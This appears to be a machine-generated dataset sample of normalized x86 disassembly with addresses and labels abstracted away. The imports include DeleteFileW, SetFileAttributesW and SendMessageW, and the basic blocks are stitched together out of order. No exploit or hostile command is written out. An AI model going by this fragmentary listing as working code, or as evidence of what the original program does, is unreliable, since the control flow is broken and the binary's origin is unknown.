jb r-xdata
call sub_4407b7
mov ebx [ ebp - 0x34 ]
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edi [ edi + 0xcc ]
add edi [ ebp - 0x50 ]
mov eax [ edi + 0x88 ]
lea ecx [ edi + 0x74 ]
push r--data
mov edi 0x8
call sub_4298e0
test eax eax
jne r-xdata
call sub_4407b7
lea ebx [ edi + ebx + 0x4 ]
mov ebx [ edi + ebx + 0x4 ]
jmp r-xdata
xor edi edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x5c ] edi
cmp ebx 0x1
jne r-xdata
push eax
call sub_440cb9
add esp 0x4
mov ebx eax
push ebx
mov ecx esi
call sub_406180
test al al
jne r-xdata
push eax
call [ DeleteFileW@IAT ]
mov ecx [ esi + 0x98 ]
sub ecx [ esi + 0x94 ]
add [ ebp - 0x24 ] 0x1c
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
inc edi
add ecx edx
cmp edi ecx
jb r-xdata
push ebx
push eax
call [ SetFileAttributesW@IAT ]
xor ebx ebx
push ebx
lea ecx [ edi - 0x7 ]
mov edx esi
call sub_402f50
test al al
je r-xdata
push 0x0
mov ecx 0x1
mov edx esi
call sub_402f50
test al al
je r-xdata
xor ecx ecx
mov [ ebp + 0x34 ] 0x7
mov [ ebp + 0x30 ] 0x0
mov [ ebp + 0x20 ] cx
mov [ ebp - 0x4 ] 0x8
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x34 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x18 ] eax
jb r-xdata
push 0x3b
push ebx
call sub_441150
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x6
mov dl [ esi + 0x7c ]
test dl dl
je r-xdata
xor eax eax
mov [ ebp + 0x88 ] 0x7
mov [ ebp + 0x84 ] edi
mov [ ebp + 0x74 ] ax
mov ebx 0x3
lea ecx [ ebp + 0x70 ]
mov [ ebp - 0x4 ] bl
call sub_428970
cmp [ ebp + 0x84 ] ebx
jbe r-xdata
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x34 ]
mov edi [ ebp - 0x18 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
mov ecx [ ebp - 0x30 ]
mov ebx [ ebp - 0x34 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp - 0x18 ] ecx
jb r-xdata
mov ecx [ ebp - 0x34 ]
add edi ecx
push edi
lea eax [ ebp + 0x1c ]
call sub_40f040
cmp [ ebp + 0x34 ] 0x8
mov ecx [ ebp + 0x20 ]
jae r-xdata
call sub_4407b7
mov edi [ esi + 0x70 ]
mov edx [ edi ]
mov eax [ edx + 0xfc ]
push edi
call eax
test eax eax
jge r-xdata
mov eax [ ebp - 0x34 ]
cmp eax edi
je r-xdata
mov cl [ esi + 0x7c ]
test cl cl
je r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
lea eax [ ebp + 0x70 ]
push eax
mov ecx esi
call sub_405980
mov edx [ ebp - 0x34 ]
lea ecx [ edi * 8 ]
sub ecx edi
cmp [ edx + ecx * 4 + 0x18 ] 0x10
lea eax [ edx + ecx * 4 ]
jb r-xdata
call sub_4407b7
cmp [ edi + ebx + 0x18 ] 0x10
jb r-xdata
call sub_4407b7
mov ebx [ ebp - 0x34 ]
lea edi [ esi + 0xb8 ]
push edi
call sub_42e6a0
test eax eax
je r-xdata
lea ecx [ ebp + 0x20 ]
mov edi [ esi + 0x70 ]
mov ecx [ edi ]
mov edx [ ecx + 0x78 ]
push 0x0
push edi
call edx
test eax eax
jge r-xdata
push r--data
push edi
push eax
call sub_43f7d0
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] edi
mov ecx [ ebp - 0x68 ]
mov edi [ ebp - 0x30 ]
push ecx
call sub_412b30
mov edx [ ebp - 0x34 ]
push edx
call sub_43f960
add esp 0x8
xor edi edi
xor ecx ecx
mov [ ebp + 0x6c ] 0x7
mov [ ebp + 0x68 ] 0x0
mov [ ebp + 0x58 ] cx
lea edi [ ebp + 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_405ef0
cmp [ ebp + 0x68 ] ebx
jbe r-xdata
cmp [ ebp + 0x88 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea edi [ edi + ebx + 0x4 ]
mov edi [ edi + ebx + 0x4 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
cmp [ ebp + 0x34 ] 0x8
jb r-xdata
lea edx [ ebp - 0x70 ]
xor ebx ebx
push edx
lea eax [ ebp - 0x50 ]
push eax
mov esi edi
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x6c ] ebx
call sub_42eae0
mov esi [ ebp - 0x58 ]
cmp [ ebp - 0x50 ] ebx
je r-xdata
mov eax [ esi + 0x70 ]
mov ecx [ eax ]
mov edx [ ecx + 0x2c ]
push 0x1
push ebx
push eax
call edx
mov edi [ esi + 0x70 ]
mov eax [ edi ]
mov ecx [ eax + 0xec ]
push ebx
push edi
call ecx
test eax eax
jge r-xdata
push r--data
push edi
push eax
call sub_43f7d0
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x90 ]
push ecx
call sub_43f960
add esp 0x4
mov dl [ esi + 0x7c ]
test dl dl
je r-xdata
lea edx [ ebp - 0x60 ]
push edx
lea eax [ ebp - 0x14 ]
push eax
mov ecx edi
push ecx
mov ecx esi
call sub_405980
mov ebx [ ebp - 0x34 ]
xor eax eax
mov [ ebp + 0x88 ] 0x7
mov [ ebp + 0x84 ] edi
mov [ ebp + 0x74 ] ax
cmp ebx edi
je r-xdata
mov edx [ ebp + 0x74 ]
push edx
call sub_43f960
add esp 0x4
mov eax [ ebp - 0x44 ]
add [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x98 ]
add [ ebp - 0x4c ] ecx
mov edi [ esi + 0xc ]
mov edx [ ebp - 0x94 ]
adc [ ebp - 0x48 ] edx
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov ebx [ ebp - 0x28 ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov eax [ ebp - 0x34 ]
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0xbc ]
push ecx
mov ecx [ esi + 0x54 ]
lea edx [ ebp - 0xb4 ]
push edx
push eax
mov eax [ esi + 0x6c ]
push eax
call ecx
mov eax [ ebp - 0xb4 ]
lea edx [ ebp - 0x9a ]
push edx
lea ecx [ ebp - 0x98 ]
push ecx
mov ecx [ ebp - 0xbc ]
lea edx [ ebp - 0x44 ]
push edx
mov edx [ esi + 0x6c ]
push ecx
push eax
mov [ esi + 0x78 ] eax
mov eax [ esi + 0x44 ]
push edx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x94 ] ebx
call eax
mov cl [ esi + 0x7c ]
add esp 0x28
test cl cl
je r-xdata
mov eax [ ebp - 0x34 ]
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x64 ]
add [ ebp - 0x24 ] edx
mov eax [ ebp - 0x78 ]
add [ ebp - 0x4c ] eax
mov ecx [ ebp - 0x74 ]
mov edi [ esi + 0xc ]
adc [ ebp - 0x48 ] ecx
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov ebx [ ebp - 0x28 ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov ecx [ esi + 0x6c ]
lea edx [ ebp - 0xb0 ]
push edx
mov edx [ esi + 0x54 ]
lea eax [ ebp - 0xa4 ]
push eax
push edi
push ecx
call edx
mov eax [ ebp - 0xa4 ]
lea ecx [ ebp - 0x99 ]
push ecx
lea edx [ ebp - 0x78 ]
push edx
mov edx [ ebp - 0xb0 ]
lea ecx [ ebp - 0x64 ]
push ecx
mov ecx [ esi + 0x44 ]
push edx
push eax
mov [ esi + 0x78 ] eax
mov eax [ esi + 0x6c ]
xor ebx ebx
push eax
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x74 ] ebx
call ecx
mov dl [ esi + 0x7c ]
add esp 0x28
test dl dl
jne r-xdata
mov eax [ ebp + 0x20 ]
push eax
call sub_43f960
mov ecx [ ebp - 0x30 ]
mov edi [ ebp - 0x28 ]
add esp 0x4
inc [ ebp - 0x18 ]
jmp r-xdata
mov edx [ ebp - 0x50 ]
add [ ebp - 0x24 ] edx
mov eax [ ebp - 0x70 ]
add [ ebp - 0x4c ] eax
mov ecx [ ebp - 0x6c ]
mov edi [ esi + 0xc ]
adc [ ebp - 0x48 ] ecx
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov ebx [ ebp - 0x28 ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov ecx [ esi + 0x84 ]
push ebx
push ebx
push 0x534
push ecx
call [ SendMessageW@IAT ]
mov dl [ esi + 0x7c ]
test dl dl
je r-xdata
push r--data
push edi
push eax
call sub_43f7d0
xor edx edx
mov [ ebp + 0x50 ] 0x7
mov [ ebp + 0x4c ] 0x0
mov [ ebp + 0x3c ] dx
lea edi [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x5
call sub_405fa0
cmp [ ebp + 0x4c ] ebx
jbe r-xdata
mov ebx 0x8
cmp [ ebp + 0x6c ] ebx
jb r-xdata
mov edx [ ebp - 0x40 ]
push edx
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] edi
call sub_43f960
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0xa4 ] 0x10
jb r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x54 ] eax
cmp ebx eax
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x1c ]
lea eax [ edx + ecx + 0x98 ]
mov ecx [ ebp - 0x98 ]
add [ eax ] ecx
mov edx [ ebp - 0x94 ]
adc [ eax + 0x4 ] edx
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
call sub_4407b7
mov ecx [ ebp - 0x40 ]
push ecx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
call sub_43f960
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0xa4 ] 0x10
jb r-xdata
mov edx [ ebp - 0x68 ]
mov edi [ ebp - 0x30 ]
push edx
call sub_412b30
mov eax [ ebp - 0x34 ]
push eax
call sub_43f960
add esp 0x8
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
jmp r-xdata
mov ecx [ ebp - 0x68 ]
mov edi [ ebp - 0x30 ]
push ecx
call sub_412b30
mov edx [ ebp - 0x34 ]
push edx
call sub_43f960
add esp 0x8
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x1c ]
lea eax [ edx + ecx + 0x98 ]
mov ecx [ ebp - 0x78 ]
add [ eax ] ecx
mov edx [ ebp - 0x74 ]
adc [ eax + 0x4 ] edx
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
call sub_4407b7
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x1c ]
lea eax [ edx + ecx + 0x98 ]
mov ecx [ ebp - 0x70 ]
add [ eax ] ecx
mov edx [ ebp - 0x6c ]
adc [ eax + 0x4 ] edx
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
call sub_4407b7
mov edi [ esi + 0x70 ]
mov edx [ edi ]
mov edx [ edx + 0x50 ]
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
push ebx
push edi
call edx
test eax eax
jge r-xdata
mov eax [ ebp - 0x34 ]
test eax eax
je r-xdata
mov al [ esi + 0x7c ]
test al al
je r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
mov edx edi
push edx
mov ecx esi
call sub_405980
xor eax eax
xor ecx ecx
mov edi 0x7
mov [ ebp + 0x6c ] edi
mov [ ebp + 0x68 ] eax
mov [ ebp + 0x58 ] cx
cmp [ ebp + 0x88 ] ebx
jb r-xdata
mov eax [ ebp + 0x58 ]
push eax
call sub_43f960
add esp 0x4
mov eax [ ebp + 0x90 ]
push eax
call sub_43f960
add esp 0x4
jmp r-xdata
push ebx
call sub_43f960
add esp 0x4
add ebx 0x18
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x1c ]
lea eax [ edx + ecx + 0x90 ]
mov ecx [ ebp - 0x44 ]
add [ eax ] ecx
mov edx [ ebp - 0x98 ]
or edx [ ebp - 0x94 ]
jne r-xdata
call sub_4407b7
mov edx [ ebp + 0x90 ]
push edx
call sub_43f960
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x40 ]
push eax
call sub_43f960
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0xa4 ] 0x10
jb r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x1c ]
lea eax [ edx + ecx + 0x90 ]
mov ecx [ ebp - 0x64 ]
add [ eax ] ecx
mov edx [ ebp - 0x78 ]
or edx [ ebp - 0x74 ]
jne r-xdata
call sub_4407b7
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x1c ]
lea eax [ edx + ecx + 0x90 ]
mov ecx [ ebp - 0x50 ]
add [ eax ] ecx
test ecx ecx
jne r-xdata
call sub_4407b7
mov eax [ ebp - 0x14 ]
add [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x60 ]
add [ ebp - 0x4c ] ecx
mov edi [ esi + 0xc ]
mov edx [ ebp - 0x5c ]
adc [ ebp - 0x48 ] edx
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov ebx [ ebp - 0x28 ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
push r--data
push edi
push eax
call sub_43f7d0
xor eax eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov ecx [ ebp - 0x68 ]
mov edi [ ebp - 0x30 ]
push ecx
call sub_412b30
mov edx [ ebp - 0x34 ]
push edx
call sub_43f960
add esp 0x8
mov edx [ ebp - 0x14 ]
add [ ebp - 0x24 ] edx
mov eax [ ebp - 0x60 ]
add [ ebp - 0x4c ] eax
mov ecx [ ebp - 0x5c ]
mov edi [ esi + 0xc ]
adc [ ebp - 0x48 ] ecx
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov ebx [ ebp - 0x28 ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0x50 ] 0x8
jb r-xdata
mov [ ebp + 0x88 ] edi
mov edi [ ebp - 0x34 ]
xor ecx ecx
mov [ ebp + 0x84 ] eax
mov [ ebp + 0x74 ] cx
cmp edi eax
je r-xdata
mov edx [ ebp + 0x74 ]
push edx
call sub_43f960
add esp 0x4
xor eax eax
mov [ ebx ] 0xf
mov [ ebx - 0x4 ] edi
mov [ ebx - 0x14 ] 0x0
add ebx 0x1c
lea ecx [ ebx - 0x18 ]
cmp ecx [ ebp - 0x54 ]
jne r-xdata
mov eax [ ebx - 0x14 ]
push eax
call sub_43f960
add esp 0x4
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
cmp [ ebp - 0x44 ] edx
cmp [ ebp - 0x64 ] edx
jmp r-xdata
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov eax [ ebp - 0x70 ]
or eax [ ebp - 0x6c ]
mov esi [ ebp - 0x58 ]
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x1c ]
lea eax [ edx + ecx + 0x98 ]
mov ecx [ ebp - 0x60 ]
add [ eax ] ecx
mov edx [ ebp - 0x5c ]
adc [ eax + 0x4 ] edx
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
call sub_4407b7
mov eax [ ebp - 0x40 ]
push eax
call sub_43f960
add esp 0x4
cmp [ ebp + 0xa4 ] 0x10
jb r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x1c ]
lea eax [ edx + ecx + 0x98 ]
mov ecx [ ebp - 0x60 ]
add [ eax ] ecx
mov edx [ ebp - 0x5c ]
adc [ eax + 0x4 ] edx
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
call sub_4407b7
xor ebx ebx
xor edx edx
cmp [ ebp + 0x6c ] 0x8
mov edi 0x7
mov [ ebp + 0x50 ] edi
mov [ ebp + 0x4c ] ebx
mov [ ebp + 0x3c ] dx
jb r-xdata
mov ecx [ ebp + 0x3c ]
push ecx
call sub_43f960
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov ebx [ ebp - 0x30 ]
cmp edi ebx
je r-xdata
cmp [ ebx ] 0x10
jb r-xdata
mov ebx [ ebp - 0x34 ]
mov ecx [ edi + 0xc ]
add ecx [ ebp - 0x1c ]
mov edx [ esi + 0x84 ]
push 0x0
push ecx
push 0x52e
push edx
call [ SendMessageW@IAT ]
call sub_4407b7
mov ebx [ ebp - 0x28 ]
je r-xdata
mov ecx [ edi + 0xc ]
add ecx [ ebp - 0x1c ]
mov edx [ esi + 0x84 ]
push 0x0
push ecx
push 0x52e
push edx
call [ SendMessageW@IAT ]
mov esi [ ebp - 0x58 ]
call sub_4407b7
mov ebx [ ebp - 0x28 ]
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x1c ]
lea eax [ edx + ecx + 0x90 ]
mov ecx [ ebp - 0x14 ]
add [ eax ] ecx
mov edx [ ebp - 0x60 ]
or edx [ ebp - 0x5c ]
jne r-xdata
call sub_4407b7
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x1c ]
lea eax [ edx + ecx + 0x90 ]
mov ecx [ ebp - 0x14 ]
add [ eax ] ecx
mov edx [ ebp - 0x60 ]
or edx [ ebp - 0x5c ]
jne r-xdata
call sub_4407b7
xor ecx ecx
cmp [ ebp + 0x88 ] 0x8
mov [ ebp + 0x6c ] edi
mov [ ebp + 0x68 ] ebx
mov [ ebp + 0x58 ] cx
jb r-xdata
mov eax [ ebp + 0x58 ]
push eax
call sub_43f960
add esp 0x4
push edi
jmp r-xdata
add edi 0x18
lea ecx [ ecx ]
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
cmp [ ebp - 0x14 ] edx
je r-xdata
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
cmp [ ebp - 0x14 ] edx
je r-xdata
xor eax eax
mov [ ebp + 0x88 ] edi
mov [ ebp + 0x84 ] ebx
mov [ ebp + 0x74 ] ax
mov edx [ ebp + 0x74 ]
push edx
call sub_43f960
add esp 0x4
call sub_43f960
add esp 0x4
mov [ edi ] 0xf
mov [ edi - 0x4 ] 0x0
mov [ edi - 0x14 ] 0x0
add edi 0x1c
lea edx [ edi - 0x18 ]
cmp edx ebx
jne r-xdata
mov eax [ edi - 0x14 ]
push eax
call sub_43f960
add esp 0x4
mov ecx [ edi + 0xc ]
add ecx [ ebp - 0x1c ]
mov edx [ esi + 0x84 ]
push 0x0
push ecx
push 0x52e
push edx
call [ SendMessageW@IAT ]
call sub_4407b7
inc [ ebp - 0x18 ]
mov edi [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x30 ]
jmp r-xdata
mov ecx [ edi + 0xc ]
add ecx [ ebp - 0x1c ]
mov edx [ esi + 0x84 ]
push 0x0
push ecx
push 0x52e
push edx
call [ SendMessageW@IAT ]
call sub_4407b7
mov edi 0x8
cmp [ ebp + 0x50 ] edi
jb r-xdata
cmp [ edi ] 0x10
jb r-xdata
mov edi [ ebp - 0x34 ]
xor ecx ecx
mov [ ebp + 0x50 ] 0x7
mov [ ebp + 0x4c ] 0x0
mov [ ebp + 0x3c ] cx
cmp [ ebp + 0x6c ] edi
jb r-xdata
mov eax [ ebp + 0x3c ]
push eax
call sub_43f960
add esp 0x4
xor eax eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp + 0x6c ] 0x7
mov [ ebp + 0x68 ] 0x0
mov [ ebp + 0x58 ] ax
cmp [ ebp + 0x88 ] edi
jb r-xdata
mov edx [ ebp + 0x58 ]
push edx
call sub_43f960
add esp 0x4
mov ecx [ ebp + 0x74 ]
push ecx
call sub_43f960
mov ecx [ ebp - 0x30 ]
mov edi [ ebp - 0x28 ]
add esp 0x4
inc [ ebp - 0x18 ]
jmp r-xdata
sub_404ec2
mov esi [ ebp - 0x58 ]
mov ecx [ ebp - 0x90 ]
xor eax eax
push ecx
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x7c ] eax
call sub_43f960
add esp 0x4
mov [ ebp - 0x4 ] 0x9
cmp [ ebp + 0x18 ] 0x10
jb r-xdata
mov edx [ ebp - 0xac ]
mov edi [ ebp - 0x80 ]
mov eax [ ebp - 0x84 ]
push edx
call sub_412b30
mov eax [ ebp - 0x84 ]
push eax
call sub_43f960
add esp 0x8
inc [ ebp - 0x18 ]
jmp r-xdata
mov edx [ ebp + 0x4 ]
push edx
call sub_43f960
add esp 0x4
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov ebx [ ebp - 0x14 ]
mov edx [ edi + 0xc ]
imul ebx ebx 0xd8
mov ecx [ ebx + edx + 0xd0 ]
sub ecx [ ebx + edx + 0xcc ]
lea eax [ ebx + edx + 0xc0 ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x54 ] ebx
cmp [ ebp - 0x18 ] eax
jae r-xdata
call sub_4407b7
inc [ ebp - 0x14 ]
xor ebx ebx
jmp r-xdata
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x14 ] eax
jae r-xdata
mov edi [ edi + 0xc ]
mov ecx [ edi + ebx + 0xd0 ]
sub ecx [ edi + ebx + 0xcc ]
add edi ebx
mov eax 0x2aaaaaab
imul ecx
mov ecx [ ebp - 0x18 ]
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp ecx eax
jb r-xdata
call sub_4407b7
mov edi [ ebp - 0xc8 ]
sub edi [ ebp - 0xcc ]
sar edi 0x2
cmp edi ebx
je r-xdata
mov [ ebp - 0x18 ] ebx
mov edx [ edi + 0xcc ]
lea eax [ ecx + ecx * 2 ]
shl eax 0x6
cmp [ eax + edx + 0x70 ] 0x0
mov [ ebp - 0x44 ] eax
je r-xdata
call sub_4407b7
mov ecx [ ebp - 0x18 ]
mov eax [ esi + 0x84 ]
push ebx
push ebx
push 0x530
push eax
call [ SendMessageW@IAT ]
mov eax [ ebp - 0xcc ]
xor esi esi
cmp eax ebx
je r-xdata
ja r-xdata
mov edi [ esi + 0xc ]
mov edx [ edi + 0x10 ]
sub edx [ edi + 0xc ]
mov eax 0x4bda12f7
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x14 ] eax
jb r-xdata
mov ecx [ ebp - 0xd8 ]
push ecx
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xc4 ] ebx
call sub_43f960
add esp 0x4
mov eax esi
jmp r-xdata
push eax
call sub_43f960
add esp 0x4
mov eax [ ebp - 0xcc ]
mov ecx [ esi + 0x6c ]
mov edx [ esi + 0x48 ]
push edi
push eax
push 0x5
push ecx
call edx
add esp 0x10
call sub_4407b7
mov edi [ edi + 0xc ]
mov edx [ edi + ebx + 0xd0 ]
sub edx [ edi + ebx + 0xcc ]
add edi ebx
mov eax 0x2aaaaaab
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp ecx eax
jb r-xdata
call sub_4407b7
mov ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0xa8 ]
xor ecx ebp
call sub_43f96b
add ebp 0xac
mov esp ebp
pop ebp
retn
mov eax [ edi + 0xcc ]
add eax [ ebp - 0x44 ]
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp ]
mov [ ebp + 0x18 ] 0xf
mov [ ebp + 0x14 ] 0x0
mov [ ebp + 0x4 ] 0x0
call sub_429ea0
lea ecx [ ebp - 0x90 ]
push ecx
mov [ ebp - 0x4 ] 0xa
call sub_40f720
lea edx [ ebp - 0x90 ]
push edx
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0xb
call sub_40f0f0
mov ecx [ ebp - 0x80 ]
sub ecx [ ebp - 0x84 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
call sub_4407b7
xor ebx ebx
lea ecx [ ebp ]
push ecx
lea ebx [ ebp - 0x90 ]
call sub_40f670
cmp [ ebp - 0x84 ] 0x0
je r-xdata
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov edi [ edi + 0xc ]
add edi [ ebp - 0x54 ]
mov eax 0x2aaaaaab
mov ecx [ edi + 0xd0 ]
sub ecx [ edi + 0xcc ]
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x18 ] eax
jb r-xdata
call sub_4407b7
mov edi [ edi + 0xcc ]
add edi [ ebp - 0x44 ]
mov eax [ edi + 0x88 ]
lea ecx [ edi + 0x74 ]
push r--data
mov edi 0x8
call sub_4298e0
test eax eax
jne r-xdata
call sub_4407b7
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x14 ] eax
jb r-xdata
cmp [ esi + 0x70 ] eax
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x54 ]
lea edi [ ecx + edx + 0xc0 ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x18 ] eax
jb r-xdata
call sub_4407b7
mov ecx [ ebp - 0x80 ]
sub ecx [ ebp - 0x84 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
